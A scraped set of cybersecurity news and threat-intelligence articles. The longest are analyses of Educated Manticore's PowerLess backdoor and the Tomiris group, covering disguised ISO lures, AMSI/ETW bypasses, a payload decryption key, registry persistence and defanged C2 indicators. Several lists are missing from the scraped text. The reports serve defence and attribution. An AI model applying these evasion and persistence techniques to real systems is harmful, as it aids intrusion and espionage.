organizations.For organizations that could be using technology that supports SLP and can be accessed from the Internet, the obvious but perhaps difficult-to-achieve solution to mitigate risk from attackers exploiting the flaw is to update any affected product to a modern version that doesn't use SLP.If this isn't possible, the researchers recommended disabling SLP on all systems running on untrusted networks, such as those directly connected to the Internet. If even that is not possible, then organizations should configure firewalls to filter traffic on UDP and TCP port 427, they said, which will prevent external attackers from accessing the SLP service.Organizations also should enforce strong authentication and access controls that closely monitor and audit access, allowing only authorized users to access the correct network resources, the researchers said.\"Organizations should also have an incident response plan in place that clearly outlines procedures for mitigating SLP vulnerabilities,\" Stone advised, \"as well as procedures for communicating with users and stakeholders in case of an incident.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Educated Manticore - Iran Aligned Threat Actor Targeting Israel via Improved Arsenal of Tools - Check Point Research",
      "text": " While the new PowerLess payload remains similar, its loading mechanisms have significantly improved, adopting techniques rarely seen in the wild, such as using .NET binary files created in mixed mode with assembly code. The newly discovered version is likely intended for phishing attacks focused around Iraq, using an ISO file to initiate the infection chain. Other documents inside the ISO file were in Hebrew and Arabic languages, suggesting the lures were aimed at Israeli targets.As the details of this attack were uncovered, two other, very similar lures have drawn our research team’s attention. Based on internal naming conventions and previous submissions, we assume with medium confidence that those lures were part of testing efforts of the same threat actor.Check Point Research tracks this activity cluster as Educated Manticore.Educated Manticore deployment of PowerLess is a multi-staged process that contains several custom components:The complete chain is depicted below:The file Iraq development resources.iso was submitted to VirusTotal by two submitters from Israeli IP addresses. At the time of this writing, it has 0 detections, possibly affected by its large size (18.5 MB). It is worth noting that the initial loader embedded in the ISO file also has a low detection rate.The ISO file is designed to deceive the user. Its structure is unique, containing a relatively large number of files in three hidden folders with names containing non-breaking spaces, in addition to the initial loader, disguised as a folder as well.A summary of the files in the ISO image:Of the three folders, the first contains an encrypted version of a custom downloader stored as zoom.jpg. The second and third are identical in terms of subfolder and file names, while one contains actual PDF lures and the other contains the same files XORed with ‘0x0a’ in the decimal format. The lures were divided into subfolders by language, containing files in Arabic, English, and Hebrew. All of them are PDF files with academic content about Iraq, suggesting the targets might have been academic researchers.What might appear in the picture as a fourth folder is actually the initial loader, a PE file named Iraq development resources                    .exe that is disguised as an empty folder, prompting users to click it without noticing its extension.The Initial loader itself is obfuscated, most likely with compiler-generated pattern-based obfuscation. In this case, the obfuscation resulted in about 1282 blocks full of junk code. Appendix “A” provides a dedicated IDAPython script we created to de-obfuscate the code.Upon execution, the initial loader:The decrypted file extracted from zoom.jpg is 64-bit PE with the main purpose of downloading and executing the next stages. The downloader is obfuscated similar to the initial loader, affected with the same compiler-generated pattern-based obfuscation, and can also be de-obfuscated with the same script provided in Appendix “A”. The string decryption is also implemented similarly, but this time using 16 different customized string-decryption functions based on TEA32 (Tiny-Encryption-Algorithm).After it is loaded into memory and run, the downloader:Right upon the first inspection of the PE structure, a few characteristics point to this .NET sample being constructed as Mixed-Mode Assembly. The “IL Only” flag inside the .NET directory flags is not checked. This means that the sample could contain not only IL code, but also unmanaged code. In addition, the Import Directory contains a set of entries for native libraries.Reverse-engineering a mixed-mode assembly code is different from pure .NET assembly code, requiring both native and IL code disassemblers. The native CRT entry point mainCRTStartup()redirects the execution back to the managed code – directly to the method main(), where all logic resides. The construction of certain strings is the first logic observed in this method. Recreating these strings reveals functionality related to the evasion techniques AMSI Bypass and ETW Bypass, as well as keys and paths required to invoke the PowerLess payload later.Following the execution of the bypasses mentioned above, the loader reads the contents of the file stored in C:\\Users\\Public\\asdfg, previously downloaded by the downloader. For the decryption, AES-128-ECB with the previously constructed key {}nj45kdada0slfk is used. Once the PowerLess Payload asdfg is decrypted, it is executed in-memory in the context of syscall02.exe, using an instance of class System.Management.Automation.PowerShell and the applicable methods.A short inspection of the supported commands in the newer version in comparison to the ones in the previously reported sample provides insight into the significant development the payload has gone through. Among the new features – showing the list of installed programs, showing the list of processes, showing a list of files, stealing user data from the Telegram desktop app, and taking screenshots.Among its capabilities, PowerLess can download extra modules, including a keylogger, browser information stealer, and a surroundings sound recorder. Previous reports have linked a similar sound recording tool to PowerLess actors, but since then, they embed it within the malware and activate it upon the “sound” command from the C&C server. The tool is downloaded from the server and saved as C:\\Windows\\temp\\ugt\\so.zip.PowerLess C&C communication to the server is Base64-encoded and encrypted after obtaining a key from the server. To mislead researchers, the threat actor actively adds three random letters at the beginning of the encoded blob.The backdoor starts by initiating a request to receive the communication encryption key from the C&C server:In response, the C&C server sends a key and a “first-time” flag:In the first run, the PowerShell backdoor enumerates the system and sends recon data nested in “info”, including the computer name, username, operating system, IP address, installation path, computer manufacturer, and security software installed:In addition, the backdoor sends the list of processes and programs from the victim’s computer. After sending the relevant information, the backdoor begins to check periodically every 48 to 72 seconds for commands from the C&C server using the fetchcommand request:The first command received from the C&C server achieves persistence on the victim’s computer by adding the key shell with the value syscall02.exe to the winlogon registry key. The persistence command is followed by a command to get logical disk names. The commands, separated by **, are sent immediately after the connection is established, which leads us to believe that it is an automated process:While analyzing the newly discovered PowerLess lures, the CPR team came across a different intrusion set that shares several characteristics with the attack chain described above. This intrusion set consists of two archive files:Although there is no clear technical overlap between the PowerLess activity and this intrusion set with the two archive files, they are likely related. Among the similarities between the two different intrusion sets:It is evident that the second campaign is incomplete and might have been part of a personal project conducted by its developer, as indicated by the PDB path D:\\Personal Cmp\\personal project\\WorkSpace\\PROJREV\\aa\\ that appears in some of the samples. It is likely that this “personal project” was developed in the same context of the PowerLess lure described above and might have taken inspiration from it or influenced it.The LNK file stored in the RAR archive executes a PowerShell script that extracts the XORed PE file from the LNK file and runs it. This PE file then downloads two files from the C&C server. At the time of our analysis, the payloads were no longer available for download. Other artifacts retrieved throughout the analysis of the second lure, SignedAgreement.zip, as well as additional files found on VirusTotal, lead us to believe that one downloaded file is the backdoor, while the second file is used to run it in memory.Clicking the malicious LNK file triggers a PowerShell script that extracts a PE file embedded within it, saving it to the %temp% folder. The script then executes the extracted file. Additionally, the file Governance_and_Development_in_Iraq.jpg is saved to the %temp% folder as Newtonsoft.Json.dlltmp1940166302.exe runs a PowerShell script to download two files from the C&C server and executes them. It is worth noting that the file names change randomly with each EXE run.The file PDB path suggests it might have been part of a personal project:D:\\Personal Cmp\\personal project\\WorkSpace\\PROJREV\\aa\\ImageLoderFinal\\x64\\Release\\ImageLoderFinal.pdb.Pivoting from this path, three additional samples surfaced, all named AgentFinal.exe. These samples were all uploaded to VirusTotal on the same day and are different versions of the same payload. The payload seems to be a relatively immature version of an implant, only capable of communicating with the C&C server and executing commands.The domain used in the payload, blackturtle.hopto[.]org, resolves to the same IP address as the domain deersharpfork[.]info that was used in the infection chain. Furthermore, the AgentFinal.exe payload uses the Newtonsoft.Json.dll library from the original archive.Based on this information, it is likely that the final payload in this infection chain is a .NET payload with similar capabilities to AgentFinal.exe.The additional archive found closely resembles Iraq-project.rar in terms of its infection chain and implementation, with the only exception being the use of a DLL file instead of an EXE file. Nevertheless, both PE files have the same objective of downloading two files from the C&C server.Similar to Iraq-project.rar, the final payloads for this infection chain were not available at the time of our analysis. However, one of the downloaded files, wmaess.exe, was submitted to VirusTotal. This file is utilized to run the PE file in memory. When executed by the DLL, it receives the second downloaded file from the C&C server, WinMAPI.exe, as an argument.The samples within this archive are reaching out to the same C&C server – deersharpfork[.]info.Since 2021, a new cluster of activity with clear ties to Iran has caught the attention of the Threat Intelligence community. The aggressive nature of the new threat, in combination with their ties to ransomware deployments, led to a thorough analysis of its activities. It was commonly called Nemesis Kitten, TunnelVision or Cobalt Mirage.What started as an extremely loud campaign, targeting networks opportunistically, was soon exposed as tied to previously reported Iranian threat actors, most prominently with those who align to some extent with APT35, Charming Kitten, or Phosphorus. Although different in nature and targeting, it shared some characteristics with the well-known actors, including infrastructure, indicating a possible common organization affiliation.Because we have no sufficient knowledge to place the activities around the PowerLess backdoor in this complex puzzle, we have decided to track this activity separately based on a new naming convention adopted by Check Point Research. According to the new convention, labeling threats as mythical creatures, Iranian-aligned threats are Manticores.Because the lures in the activity described in this report were academic in nature and because overlapping activities often pursue similar targets, we have decided to name this actor Educated Manticore.In this report, we analyzed newly discovered infection chains attributed to Educated Manticore, a threat actor aligned with the Iranian state interests. Based on Check Point Research observations, as demonstrated in this report, Educated Manticore continues to evolve, refining previously observed toolsets and delivering mechanisms.Analysis of the new PowerLess variant suggests the actor adopts popular trends to avoid detection, such as using archive files and ISO images. In parallel to adopting these trends, they keep developing custom toolsets using advanced techniques, such as .NET binaries using Mixed Mode Assembly.The variant described in this report was delivered using ISO files, indicating it is likely meant to be the initial infection vector. Because it is an updated version of previously reported malware, PowerLess, associated with some of Phosphorus’ Ransomware operations, it is important to note that it might only represent the early stages of infection, with significant fractions of post-infection activity yet to be seen in the wild.Check Point Customers remain protected against the threat described in this research.subinfralab[.]infodeersharpfork[.]infoblackturtle.hopto[.]orgArchives3e1ed006e120a1afaa49f93b4156a992f8d799b1888ca6202c1098862323c308 29318f46476dc0cfd7b928a2861fea1b761496eb5d6a26040e481c3bd655051a 13bab4e32cd6365dba40424d20525cb84b4c6d71d3c5088fe94a6cfe07573e8e 6e842691116c188b823b7692181a428e9255af3516857b9f2eebdeca4638e96e bc8f075c1b3fa54f1d9f4ac622258f3e8a484714521d89aa170246ce04701441 706510916cfc7624ec5d9f9598c95570d48fa8601eecbbae307e0af7618d1460PE filese5ba06943abb666f69f757fcd591dd1cceb66cad698fb894d9bc8911282198c4 97a615e69c38db9dffda6be7c11dd27547ce4036a4998a1469fa81b548c6f0b0 e5016dfeae584de20a90f1bef073c862028f410d5b0ae4c074a696b8f8528037 5704bc31061c7ca675bb9d56b9b56a175bf949accf6542999b3a7305af485906 4fcde8ec5983cf1465ff7dbcd7d90fcd47d666b0b8352db1dcd311084ed1b3e8 7cc9d887d47f99ca37d2fee6171067df70b4417e96fdb661b9fef697124444cc bdb2a12f2f84c3742240b8b9e1d6638a73c6b8752aff476051fe33a0bb408010 5d216f5625caf92d224200647147d27bb79e1cff6c8a9fbcac63f321f6bbf02b 62d0b8b5d4281ce107c43d36f222680b0cc85844b8973b645095ccdfb128454dLNK1672a14a3e54a127493a2b8257599c5582204846a78521b139b074155003cba4 0f4d309f0145324a6867108bb04a8d5d292e7939223d6d63f44e21a1ce45ce4ePowerShell737cb075ba0b5ed6d8901dcd798eecff0bc8585091bc232c54f92df7f9e9e817 cd813d56cf9f2201a2fa69e77fb9acaaa37e64183c708de64cb5cb7c3035a184 c0de9b90a0ac591147d62864264bf00b6ec17c55f7095fdf58923085fe502400 59a4b11b9fb93e3de7c27c25258cec43de38f86f37d88615687ab8402e4ae51eSubscribe for cpr blogs, news and more© 1994- Check Point Software Technologies LTD.

      "title": "National cybersecurity labeling program expected in May for IoT devices | SC Media",
      "text": "  “There is an urgent need to create a culture of up-leveling and raising the baseline culture when it comes to design, security and transparency of the processes that promote security, like processes that support qualified disclosure,” she added.The Biden administration first announced its plans to work with the private sector, federal agencies and academic institutions on advancing a national cybersecurity labeling program for IoT devices in November, noting it was a priority for its ongoing critical infrastructure security plans. Given the prevalence of the devices and growth of the market, a labeling program would assure consumers these devices are safe and incentivize manufacturers to meet higher cybersecurity standards.The recent executive order directs the National Institute of Standards and Technology (NIST) to pilot and label consumer-facing IoT cybersecurity products, explained Katerina Megas, NIST’s cybersecurity for IoT program manager. So the team has been working to build on the core baseline, which is designed to apply across the board for all IoT devices irrespective of market sector.Very early on, the project leaders found a consistent theme of fragmentation within the IoT market itself. NIST has since started to build on the common core baseline to tailor it to specific risk profiles, working with industry stakeholders and inviting public comments to better understand the appropriate baseline for consumer-facing devices.The effort has received positive feedback from the industry.“Samsung is here to support a voluntary IoT cyber labeling program here in the United States that's globally harmonized and incentivizes manufacturers for adoption,” said Eric Tamarkin, senior director and public policy counsel of US Public Affairs for Samsung Electronics America.“We've been working with our industry partners on this, and we hope for a successful launch,” he added.Labels refer to the requirements and other aspects of a security program, much like an offensive declaration for a consumer IoT product, anchored to NIST criteria. The ongoing focus for consumer device labeling is a common market screening or padlock for these devices.The existing label program has criteria for use of the market license, the program, the scheme, and who takes ownership of these issues within the business to manage business processes with manufacturers, signed contracts, sublicense support from the oversight structure, the program owner, and federal aid.It should be clear, however, that this “is not a single structure,” Michael Bergman, vice president of technology and standards for the Consumer Technology Association. “IoT is too broad and too fast and too varied to use a single scheme.”For example, “drones are different from doorbell cameras: drones fly over the horizon, mobile cameras to the cloud,” he continued, adding that what’s needed is multiple schemes licensed to issue the mark. “At the end of the day, we need some kind of oversight structure.”Currently, the government is working to understand the trust mechanisms that must be built into the program.These security conversations are not just about right now, it’s about planning for the future, Elazari explained. Device labeling should be thought about within the context of a broader conversation “on both baseline security measures, as well as the importance of connecting or securing all connected devices.”So far, the NIST project has made key determinations. For one, the scope of IoT in general is too broad for a standard set of criteria able to apply to both drones and doorbells. “The optimal way to approach this would be to articulate requirements as cybersecurity outcomes and to get very specific into how we expect those cybersecurity outcomes to be achieved,” said Megas. In the end, there will be a “program owner ultimately responsible, and NIST’s role is to provide those recommendations.”“It will be ultimately up to the programmer to determine how they will apply those recommendations, how they will enforce them, and accept them,” she added. “Our role will be to be there to advise the program owner on all of the recommendations and also to help advise on formative assessment programs.”And that’s where being proactive will enable device manufacturers to keep pace during the ongoing regulatory shift.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.It’s clear iLeakage presents itself as a major flaw with no known mitigation and it’s a real problem for iOS devices – here are some ideas on how to respond.

      "title": "'GhostToken' vulnerability could permanently expose data of Google users | SC Media",
      "text": "  A zero-day vulnerability dubbed “GhostToken” could let threat actors gain unremovable access to a victim's Google account by converting an authorized third-party app into a malicious trojan, leaving a victim's personal data exposed indefintely. On the other hand, the attacker can use a refresh token they receive when they take over the victim’s account to access the victim’s account and then hide the app again to restore its unremovable state. Since these applications are hidden from the victim’s view, the victim remains in the dark. They are prevented from even knowing their account has been hacked — and even if they do suspect it — the only step they can take is to set up a new Google account. While security researchers can consider this new from a “known attack technique” perspective, the abused feature it leverages has been there for a while, said Mike Parkin, senior technical engineer at Vulcan Cyber.Of course, depending on the permissions victims assign the malicious app, attackers can potentially read the victim’s private correspondences in Gmail, gain access to personal Google Drive and Google Photos files, view planned events on Google calendar, track the victim’s location via Google Maps, and grant access to the victim’s Google Cloud Platform services. Craig Burland, chief information security officer at Inversion6, added that the disclosure from Astrix should help cybersecurity teams bring focus to cloud security and specifically third-party integrations. Burland said the cloud ecosystem offers a wealth of integrations that can add or enhance capabilities: everything from simple mail-merge to full-blown analytics are just a few clicks away.“But there’s another side to that coin,” said Burland. “Cyber teams are already struggling to efficiently and effectively manage third-party risk as organizations lob 300-question surveys at each other in desperation. Cloud integrations bypass all of that governance and cut straight to the heart, boosting productivity and also inviting risk. So, who looks to see what’s integrated with your cloud application? Who checks what rights and permissions have been granted? What personal data has been exposed?”TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " Editor, Infosecurity MagazineRansomware continues to be the biggest threat to Five Eyes collation nations and it is getting worse, with financial gains no longer the sole motivation for threat actors today.While speaking about how essential coalitions are to the fight against ransomware, Felicity Oswald, COO at the UK’s National Cyber Security Centre (NCSC), said that in the UK ransomware is getting worse because threat actors no longer need to be skilled to hire a ransomware attack surface or methodology.Oswald also highlighted how financial motivation is not the only driver for cyber-criminals today and some ransomware attacks are being activated by nation-states.Representatives from the US, Canada and Australia concurred with the assessment that for them, ransomware is of huge concern to most technologically advanced countries. The Five Eyes nations are Australia, Canada, New Zealand, the UK and US, who share a broad range of intelligence with one another.Rita Erfurt, threat intelligence senior executive at the Australian Cyber Security Centre (ACSC), noted that large incidents affecting Australian organizations have had the effect of eroding trust and confidence in the nation’s digital economy.“Ransomware is the most destructive form of cybercrime facing Australia,” she noted.Healthcare, education and other essential public services have become lucrative targets in recent years highlighting the indiscriminate nature of ransomware threat actors.All of the national representatives speaking at the panel noted that their cybersecurity strategies are either under review or have recently been published.In Australia, a new strategy is under development and will set out the nation’s cybersecurity priorities from 2023 to 2030.For Canada, the current cybersecurity strategy dates back to 2018 so it is currently under review, with Khoury expecting that the document will be completed in the summer of 2023.On ransomware, Rob Joyce, director of cybersecurity at the National Security Agency, highlighted the US strategy’s approach to ransomware.“The first is we will investigate ransomware crimes using law enforcement and other authorities to disrupt the ransomware infrastructure. A second, big area of focus is, improving critical infrastructure to withstand those ransomware attacks. The third is addressing the abuses of virtual currency to launder ransomware payments and the fourth is leveraging the international operation to disrupt the ransomware ecosystem,” Joyce outlined.While the group was keen to emphasize the need for organizations to share breach data with government bodies, the approaches to mandatory reporting vary.“Information sharing continues to be our number one challenge,” Khoury noted, speaking about how there is a need for breached organizations to share their information with national agencies. At the moment, Canada does not have any mandatory reporting powers.In the US, the Cyber Incident Reporting for Critical Infrastructure Act of 2022 requires critical infrastructure organizations to report malicious activity to the CISA.In the UK, certain organizations are legally required to report a cyber breach to the Information Commissioners Office (ICO) within 72 hours of the incident. The NCSC is not a regulator but does work closely with the ICO.This is similar in Australia where there are no overarching regulations but mandatory reporting is required for critical national infrastructure organizations.“I think we need a balance and the challenge for all of us is balancing things that are mandatory with things that are encouraged. We have to work with our regulators but also our private sector and public sector and CNI,” Oswald said.“From an ACSC perspective it is vital that we have as many organizations volunteer their own personal reports as much as possible because it allows us to pull together a really comprehensive threat picture,” Erhart said. “The more we can encourage people to report through to us on the things that they are experiencing then the better we can turn that information around and advise the Australian community.”The Canadian government has recently presented a bill to parliament in support of making some of its own mandatory reporting requirements for federally regulated sectors."

      "title": "Bill proposes new DHS centers for testing security of critical government tech ",
      "text": " The Department of Homeland Security would create cybersecurity testing centers under new legislation based on a recommendation from congressional cybersecurity experts.The Critical Technology Security Centers Act of 2023 introduced Tuesday by Rep. Ritchie Torres (D-N.Y.) would create two cybersecurity-focused offices to evaluate and test the security of critical technology used by the federal government.“These centers would strengthen the capacity of the U.S. government to test the security of critical technologies and, when appropriate, assist in identifying vulnerabilities, developing mitigation techniques with relevant original equipment manufacturers, and supporting new and ongoing efforts to certify technologies as secure,” the spokesperson said.“The Centers could also play an important role as project managers and, in some cases, would provide funding for the broader research community already working toward similar ends.”As of Tuesday, there was no word about cosponsors or a Senate version of the bill. Sen. Angus King (I-Maine) was a member of the commission, as was a prominent House Republican, Mike Gallagher of Wisconsin.The centers would focus on the security of information and communications technology as well as networked industrial equipment like connected programmable data logic controllers (PLCs) and supervisory control and data acquisition servers (SCADA) — both of which have become frequent targets of nation state actors in recent years.The centers will also examine open source software and other software used by the federal government.The DHS Undersecretary for Science and Technology could also expand the topics covered by the centers. Any vulnerabilities found by the center would have to be reported to developers through coordinated disclosure processes and the Cybersecurity and Infrastructure Security Agency (CISA).The centers also would be tasked with “developing capabilities that can detect or eliminate entire classes of vulnerabilities.”The bill includes a section allowing centers to award grants to individual open source software developers and maintainers, nonprofit organizations, and other non-federal entities to “fund improvements in the security of the open source software ecosystem.”The centers would get $42 million in fiscal 2024, with funding gradually increasing each year to $52 million by 2028.Much of the bill pulls language directly from the recommendations listed in the commission’s report.Several experts said the bill raises a good idea but may face headwinds when it comes to implementation.“Most of the capability to test both commercial and open-source projects exists now, spread among independent, commercial, and government organizations,” said Mike Parkin, senior technical engineer at Vulcan Cyber.“If this is implemented properly and helps to coordinate these research efforts and get their results to the right people in a useful format, great. But there are a lot of steps between proposing new legislation and having that legislation become an effective security tool.”Viakoo CEO Bud Broomhead suggested that the centers should draw on existing work being done within Information Sharing and Analysis Centers (ISACs) and university-sponsored efforts, such as the Real Estate Cyber Consortium or Commonwealth of Virginia Cybersecurity Initiative, which he said are already serving some of the functions proposed in this legislation.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Threat actors armed with artificial intelligence (AI) tools like ChatGPT can pass the bar exam, ace an Advanced Placement biology course, and even create polymorphic malware. It's up to the cybersecurity community to put AI to work to combat it. To demonstrate, Rhai called up onto the screen a ChatGPT avatar, one he called \"GoodGPT.\" \"Calling it 'good' is somehow personally comforting to me,\" he added. He then asked it basic cybersecurity questions. \"Without AI, zero trust has zero chance,\" Ghai said. \"Identity is the most attacked part of the attack surface.\" It's no big secret the security operations center (SOC) is overwhelmed. In fact, Ghai said the industry average timeframe to identify and remediate an attack is about 277 days. But with AI, it's possible to manage access in the most granular terms, in real time, and at the data level, creating a framework that is truly based on the principle of least privilege. \"We need solutions that ensure identity throughout the user lifecycle,\" he added. During this year's RSA, Ghai said there are at least 10 vendors selling AI-powered cybersecurity solutions positioned as a tool that will help human cybersecurity professionals. Ghai characterized the current pitch as AI-as-a-copilot. But that framing belies the reality, he warned. \"The copilot description sugarcoats a truth,\" Ghai said. \"Over time many jobs will disappear.\" The role of humans, he explained, will evolve into creating algorithms to ask important questions, along with supervising AI's activities and handling exceptions. \"It's humans who will ask those questions which have never been asked before,\" he said. Ultimately, humans and enterprises will have to rely on AI to protect them. \"And the cybersecurity community can protect 'good' AI,\" Ghai added.

      "text": " Distributed denial-of-service (DDoS) is the attack method businesses are most concerned about, believing it will have the largest impact on the business.\"With edge, the attack surface is changing, and taking down a large number of Internet of things (IoT) devices can have significant impact on the business,\" she says. \"The near real-time data created and consumed by most edge use cases make DDoS attacks attractive. By its definition, a DDoS attack will degrade a network and response time.\"She adds, \"Those who have not invested in DDoS protection are indicating the timing is right to do so.\"The study also found ransomware dropped to eighth place out of eight in perceived likelihood of attack type. Yet Lanowitz notes that over the past 24 months, organizations of all types and sizes have invested in ransomware prevention.\"However, ransomware criminals and their attacks are relentless,\" she cautions. Additional analysis suggests cyber-adversaries may be cycling with the rise and fall of different types of attacks.\"Operating systems embedded in edge IoT devices make it more expensive for a financially motivated adversary to target the device with ransomware,\" Lanowitz says. \"It is far more time intensive to write and deploy destructive code for an IoT device running a derivative of a version of Linux than to target a Windows-based laptop.\"She explains one of the most pleasantly surprising findings in the report is how organizations are investing in security for edge: Security budgets have become 22% of overall project budgets, equally distributed with strategy.\"We asked survey participants how they were allocating their budgets for the primary edge use cases,\" she says. \"The results show that security is clearly an integral part of edge, and that security is being planned for proactively.\"She points to survey results that indicate applications, and the much-needed security for ephemeral edge applications, are part of the broader plan for edge project budgets.\"The expected outcome of what the edge delivers is shifting how organizations budget, plan, and think about focusing on a digital-first business,\" Lanowitz adds.Another surprising result from the survey is that globally, the likelihood of a compromise and impact to the business decreased by 28% and 26%, respectively.\"Perhaps this is a case of irrational exuberance, but our qualitative analysis proves that with the edge there is far more communication and collaboration,\" she says. \"Communication, cross-functional work, the line of business leading edge investments, and the use of trusted advisors all play a role in more optimism regarding catastrophic security events.\"She adds this also points to the eradication of silos in organization and the reality that teams need to work together.\"Edge computing, with its changing attack surface means the adversaries are seeing things differently,\" Lanowitz says. \"Likewise, businesses must take that same view of an expanded attack surface, potential new threats, or potential increases in existing threats.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Tomiris called, they want their Turla malware back | Securelist",
      "text": " Solutions for:ThreatsCategories24 Apr 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsWe continued to track Tomiris as a separate threat actor over three new attack campaigns between 2021 and 2023, and our telemetry allowed us to shed light on the group. In this blog post, we’re excited to share what we now know of Tomiris with the broader community, and discuss further evidence of a possible connection to Turla.The following map shows the countries where we detected Tomiris targets (colored in green: Afghanistan and CIS members or ratifiers). It is worth noting that while we identified a few targets in other locations, all of them appear to be foreign diplomatic entities of the colored countries:Tomiris uses a wide variety of malware implants developed at a rapid pace and in all programming languages imaginable. We hypothesize that the general aim is to provide operators with “full-spectrum malware” in order to evade security products. In fact, on several occasions we observed the actor persistently cycling through available malware strains until one of them was finally allowed to run on victim machines.Tools used by Tomiris fall into three categories:In addition, Tomiris leveraged open-source or commercially available implants and offensive tools. Notably, the latter were associated with Tomiris because they were downloaded from Tomiris downloader, shared a common C2 with other Tomiris implants, and/or were leveraged to deploy other Tomiris implants:Relationships between Tomiris tools. Arrows indicate direct execution.Overall, pieces from the Tomiris toolset appear to be generally interchangeable and don’t appear to be tied to specific campaigns or victims. Operators routinely mix and match the various families, trying to deploy tools (often repeatedly) with little regard for stealth until one doesn’t get caught by antivirus software.The following paragraphs provide a summary description of the main malware strains used by Tomiris.Telemiris is a Python backdoor originally packed with PyInstaller (we later identified some Nuitka-packaged samples as well). Its name derives from the fact that it uses Telegram as a C2 channel. After setting up persistence (copying itself under %AppData%/service/ and creating a RUN key entry), the malware enters its main loop where it waits for Telegram messages and replies to them. Supported commands are:From what we observed, Telemiris is used as a first-stage implant that operators use to deploy other tools such as Roopy, JLORAT, or even the legitimate WinSCP binary, to further exfiltrate files.Then, every 40-80 minutes, Roopy crawls C:\\Users and all other drives (D:, E:, …), looks for all documents (.doc, .docx, .xls, .xlsx, .txt, .pdf) modified in the last month, and stages them for upload. Discovered files are collected in ZIP archives up to 5MB in size and sent to the C2 server over plain HTTP using POST requests containing such data as:\nThis data format, naming convention as well as the URL scheme used by the C2 server (i.e., /h/pa) are very similar to SBZ filestealer. We identified a number of variants of Roopy where logging can be either enabled or disabled by default, or where the base64 encoding scheme was replaced by a simple subtraction from the bytes of the obfuscated data.\nJLORAT then looks for specific keywords in the data returned by the C2 to start processing orders.Data sent to port 9999 is not passed in a JSON dictionary, but instead follows a specific format:We also discovered variants of JLORAT bundled with additional modules – effectively turning it into a file stealer we call JLOGRAB. Just like Roopy, JLOGRAB:JLORAT contains traces of Russian language in status messages (“Директория установлена!”, meaning “Directory set”). The source binary also contains metadata indicating some of the source code is stored in a “moduls” folder, which appears to be a misspelling of the English word “modules”, or a poor transliteration of the Russian word “модуль” (pronounced: modul’).While publicly available data indeed shows that anam0rph[.]su was re-registered on August 12, 2022, we couldn’t find any link between Andromeda and KopiLuwak from our telemetry. Nevertheless, we had been tracking QUIETCANARY since 2019 under the name “TunnusSched” (not “Tunnus” as Mandiant’s reporting indicates), and decided to take a closer look at samples collected during the same period.To our great surprise, we discovered one TunnusSched/QUIETCANARY sample (MD5 B38160FC836AD42F1753A0873C844925) had been delivered to a government target in the CIS on September 13, 2022. Our telemetry additionally shows that this TunnusSched malware was deployed…from Tomiris’s Telemiris (MD5 C49DBF390E876E926A338EA07AC5D4A7).More precisely, on September 13, 2022, around 05:40 UTC, an operator attempted to deploy several known Tomiris implants via Telemiris: first a Python Meterpreter loader, then JLORAT and Roopy. These efforts were thwarted by security products, which led the attacker to make repeated attempts, from various locations on the filesystem:\nAll these attempts ended in failure. After a one-hour pause, the operator tried again at 07:19 UTC, this time using a TunnusSched/QUIETCANARY sample:\nThe TunnusSched sample was blocked as well, and the operator resumed trying to deploy JLORAT and Roopy samples up to the next day. This activity and brute-force approach to infection is completely consistent with other Tomiris infections we have observed in the past.Mandiant noted that some elements of the recent TunnuSched case they analyzed “appear to be a departure from historical Turla operations”, but the use of KopiLuwak and TunnusSched led them to link this activity to Turla anyway. In order to perform a critical analysis of this attribution process, we need to go back in time.Starting from 2019, we discovered additional implant families that were linked to KopiLuwak (and so, to Turla), starting from 2019. The implants were additionally linked together, mainly because they leverage an identical RC4 implementation:Code similarity between Topinambour (left) and TunnusSched (right)The RC4 implementation in these samples results in strictly identical .NET bytecode that, as far as we could verify, is unique to Tunnus, TunnusSched and Topinambour.The fact that all these implants are interconnected leaves little doubt, and Topinambour at least is strongly linked with KopiLuwak. As a result, we (still) believe with high confidence that TunnusSched and KopiLuwak are both part of similar toolsets, starting from 2019 at the latest.Mandiant’s recent findings also confirm that KopiLuwak and TunnusSched were still part of the same toolset as of September 2022, as they were both deployed against targets in Ukraine during a single operation.As we recently discovered (and detailed in “Tomiris’s deployment spree: TunnusSched giveaway”), TunnusSched was leveraged by Tomiris against a government target in the CIS in September 2022.Additionally, we believe with medium confidence the TunnusSched usage described by Mandiant to be part of Tomiris’s operations, because:As we have already established, TunnusSched and KopiLuwak are part of similar toolsets (starting from 2019 at least). They were also used together during the same operation in September 2022 in the CIS, while TunnusSched was also deployed separately by Tomiris in the CIS – both independently analyzed cases leveraging very similar TunnusSched samples.As a result, we believe with medium-to-high confidence that both TunnusSched and KopiLuwak are being leveraged by Tomiris. Additionally, we cannot rule out Tomiris having used KopiLuwak as early as 2019, conducting operations that may have been wrongly attributed to Turla back then.This entire discussion would be moot if we believed Tomiris to be (a sub-cluster of) Turla – but this is not the case. While our initial blog post introducing Tomiris noted similarities with malware used in the Sunburst attack, we continued to track the two sets of activity separately. Years later, we are convinced that despite possible ties between the two groups, Turla and Tomiris are separate actors. Tomiris is undoubtedly Russian-speaking, but its targeting and tradecrafts are significantly at odds with what we have observed for Turla. In addition, Tomiris’s general approach to intrusion and limited interest in stealth are significantly at odds with documented Turla tradecraft.It follows that two groups (that we know of) may have used KopiLuwak at different points in time. What are the possible explanations for this?Our assessment is that the first two hypotheses are the least likely and that there exists a form of deliberate cooperation between Tomiris and Turla. Its exact nature is, however, hard to determine with the information we have at hand. In any case, depending on when Tomiris started using KopiLuwak, a number of campaigns and tools believed to be linked to Turla may in fact need to be 